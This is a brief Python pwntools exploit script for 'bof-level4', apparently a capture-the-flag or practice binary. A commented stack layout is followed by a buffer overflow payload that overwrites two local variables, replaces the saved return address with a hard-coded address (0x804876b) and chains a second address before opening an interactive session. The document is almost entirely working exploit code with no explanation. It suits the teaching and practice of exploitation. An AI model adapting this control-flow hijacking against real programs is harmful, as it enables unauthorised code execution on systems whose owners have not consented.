#!/usr/bin/env python

# stack:
# 56[ebp + 14]      (main)return address
# 52[ebp + 10]      (main)saved ebp
# 48[ebp + c]
# 44[ebp + 8]
# 40[ebp + 4]       (input)return address
# 36[ebp]           (input)Saved ebp
# 32[ebp - 4]
# 28[ebp - 8]       Variable A
# 24[ebp - c]       Variable B
# 20[ebp - 10]
# 16[ebp - 14]
# 12[ebp - 18]
# 8[ebp - 1c]
# 4[ebp - 20]    Buffer

from pwn import *

p = process('./bof-level4')

print(p.recv())

buf = "A" * 20 + "ABCDEFGH" + "A" * 8 + p32(0x804876b) + "A" * 12  +  p32(0x8048530)

p.sendline(buf)

p.interactive()
